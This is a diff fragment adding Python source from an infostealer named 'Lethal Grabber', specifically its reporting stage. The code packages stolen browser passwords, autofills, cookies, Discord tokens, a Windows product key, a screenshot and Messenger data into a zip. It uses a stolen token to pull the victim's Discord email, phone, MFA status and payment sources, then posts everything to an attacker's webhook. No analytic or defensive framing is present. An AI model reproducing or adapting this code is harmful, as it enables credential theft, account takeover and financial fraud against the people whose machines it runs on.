@@ -1,0 +1,83 @@
+
+
+  
+    embed = {
+        "title": "💀 **Lethal Grabber** 💀",
+        "color": 0xFF1100,
+        "timestamp": timestamp,
+        "description": f"```css\\nPC: {sys_info.get('PC','Unknown')}\\nUser: {sys_info.get('User','Unknown')}\\nOS: {sys_info.get('OS','Unknown')}\\nIP: {sys_info.get('IP','Unknown')}\\nHWID: {sys_info.get('HWID','Unknown')}\\n```",
+        "fields": [],
+        "footer": {"text": f"Data extraction completed in {time.time()-start:.2f}s"}
+    }
+    
+    stats = [f"Passwords: {len(passwords)}", f"Autofills: {len(autofills)}", f"Cookies: {len(cookies)}", f"Tokens: {len(tokens)}"]
+    embed["fields"].append({"name": "**Extraction Statistics**", "value": f"```yaml\\n{chr(10).join(stats)}\\n```", "inline": False})
+
+    if tokens:
+        try:
+            hdrs = {"Authorization": tokens[0], "Content-Type": "application/json"}
+            r = requests.get("https://discord.com/api/v10/users/@me", headers=hdrs, timeout=5)
+            if r.status_code == 200:
+                u = r.json()
+                nitro = "None"
+                billing = "None"
+                try:
+                    r2 = requests.get("https://discord.com/api/v10/users/@me/billing/subscriptions", headers=hdrs, timeout=5)
+                    if r2.status_code == 200:
+                        subs = r2.json()
+                        if subs: nitro = ", ".join([s.get("plan_id","?") for s in subs])
+                except: pass
+                try:
+                    r3 = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=hdrs, timeout=5)
+                    if r3.status_code == 200:
+                        srcs = r3.json()
+                        if srcs: billing = ", ".join([s.get("type","?") for s in srcs])
+                except: pass
+                details = [
+                    f"Username: {u.get('username','?')}#{u.get('discriminator','0')}",
+                    f"ID: {u.get('id','?')}",
+                    f"Email: {u.get('email','None')}",
+                    f"Phone: {u.get('phone','None')}",
+                    f"MFA: {'Enabled' if u.get('mfa_enabled') else 'Disabled'}",
+                    f"Verified: {u.get('verified',False)}",
+                    f"Nitro: {nitro}",
+                    f"Billing: {billing}",
+                ]
+                embed["fields"].append({"name": "**Primary Discord Account**", "value": f"```nim\\n{chr(10).join(details)}\\n```", "inline": False})
+        except: pass
+    
+    items = []
+    if FEAT_PASSWORDS and passwords: items.append(f"+ passwords.txt ({len(passwords)} entries)")
+    if FEAT_AUTOFILLS and autofills: items.append(f"+ autofills.txt ({len(autofills)} entries)")
+    if FEAT_COOKIES and cookies: items.append(f"+ cookies.txt ({len(cookies)} entries)")
+    if FEAT_TOKENS and tokens: items.append(f"+ discord_tokens.txt ({len(tokens)} tokens)")
+    if FEAT_WINKEY: items.append("+ windows_product_key.txt")
+    if FEAT_SCREENSHOT: items.append("+ screenshot.png")
+    if FEAT_MESSENGER: items.append("+ Messenger/")
+    if items:
+        embed["fields"].append({"name": "**Collection Complete**", "value": f"```diff\\n{chr(10).join(items)}\\n```", "inline": False})
+    
+    if scanned:
+        embed["fields"].append({"name": "**Browsers Scanned**", "value": f"```\\n{', '.join(scanned)}\\n```", "inline": False})
+    
+    try:
+        zip_buffer.seek(0)
+        payload = {
+            "username": WEBHOOK_NAME or "Lethal Grabber",
+            "avatar_url": WEBHOOK_AVATAR or "",
+            "embeds": [embed],
+            "attachments": [{"id": "0", "filename": "LethalGrabber_Data.zip", "description": "Collected data"}]
+        }
+        files = {
+            "payload_json": (None, json.dumps(payload)),
+            "files[0]": ("LethalGrabber_Data.zip", zip_buffer.getvalue(), "application/zip")
+        }
+        r = requests.post(WEBHOOK_URL, files=files, timeout=30)
+        return r.status_code in (200, 204)
+    except:
+        try:
+            r = requests.post(WEBHOOK_URL, json={"username": WEBHOOK_NAME, "avatar_url": WEBHOOK_AVATAR, "embeds": [embed]}, timeout=30)
+            return r.status_code in (200, 204)
+        except:
+            return False
+
